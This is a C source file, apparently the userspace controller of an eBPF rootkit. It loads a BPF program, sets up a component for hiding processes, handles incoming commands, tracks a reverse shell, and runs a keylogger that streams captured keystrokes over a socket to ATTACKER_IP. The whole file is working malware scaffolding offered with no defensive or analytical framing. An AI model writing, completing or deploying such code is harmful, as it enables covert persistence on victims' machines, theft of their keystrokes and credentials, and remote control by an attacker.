#include <errno.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/command_processor.h"
#include "userspace/hider.h"
#include "userspace/loader.h"
#include "userspace/rootkit.h"

#define RING_BUFF_POLL_TIMEOUT_MS 100

int rootkit_init(application_context_t *application_ctx, const char *exec_name) {
    if (!application_ctx)
        return -EINVAL;

    application_ctx->executable_name = exec_name;
    application_ctx->reverse_shell_pid = -1;
    application_ctx->running = true;

    application_ctx->keylogger_ctx.keylogger_active = false;
    application_ctx->keylogger_ctx.keylogger_socket_fd = -1;

    application_ctx->hider_ctx.is_initialized = false;
    application_ctx->loader_ctx.hider_ctx = &application_ctx->hider_ctx;
    application_ctx->skel = loader_load_rootkit(&application_ctx->loader_ctx);
    if (!application_ctx->skel)
        return -EINVAL;

    application_ctx->command_processor_ctx.tracked_pids_map_fd =
        bpf_map__fd(application_ctx->skel->maps.tracked_pids_map);
    application_ctx->command_processor_ctx.executable_name = exec_name;
    application_ctx->command_processor_ctx.reverse_shell_pid = &application_ctx->reverse_shell_pid;
    application_ctx->command_processor_ctx.rootkit_running = &application_ctx->running;
    application_ctx->command_processor_ctx.keylogger_active =
        &application_ctx->keylogger_ctx.keylogger_active;
    application_ctx->command_processor_ctx.hider_ctx = &application_ctx->hider_ctx;

    application_ctx->command_event_rb = ring_buffer__new(
        bpf_map__fd(application_ctx->skel->maps.events), command_processor_handle_received_command,
        &application_ctx->command_processor_ctx, NULL);
    if (!application_ctx->command_event_rb)
        goto fail;

    application_ctx->keylogger_event_rb =
        ring_buffer__new(bpf_map__fd(application_ctx->skel->maps.keylog_events),
                         keylogger_processor_process_event, &application_ctx->keylogger_ctx, NULL);
    if (!application_ctx->keylogger_event_rb)
        goto fail;

    return 0;

fail:
    rootkit_cleanup(application_ctx);
    return -ENOMEM;
}

int rootkit_run(application_context_t *application_ctx) {
    if (!application_ctx)
        return -EINVAL;

    while (application_ctx->running) {
        ring_buffer__poll(application_ctx->command_event_rb, RING_BUFF_POLL_TIMEOUT_MS);

        if (application_ctx->keylogger_ctx.keylogger_active) {
            if (application_ctx->keylogger_ctx.keylogger_socket_fd < 0) {
                application_ctx->keylogger_ctx.keylogger_socket_fd =
                    keylogger_processor_init_sender_socket(&application_ctx->keylogger_ctx,
                                                           ATTACKER_IP, KEYLOGGER_PORT);
            }
            ring_buffer__poll(application_ctx->keylogger_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
        }
    }
    return 0;
}

void rootkit_cleanup(application_context_t *application_ctx) {
    if (!application_ctx)
        return;

    if (application_ctx->command_event_rb) {
        ring_buffer__free(application_ctx->command_event_rb);
        application_ctx->command_event_rb = NULL;
    }

    if (application_ctx->keylogger_event_rb) {
        ring_buffer__free(application_ctx->keylogger_event_rb);
        application_ctx->keylogger_event_rb = NULL;
    }

    keylogger_processor_cleanup(&application_ctx->keylogger_ctx);

    if (application_ctx->skel) {
        loader_unload_rootkit(application_ctx->skel);
        application_ctx->skel = NULL;
    }
}
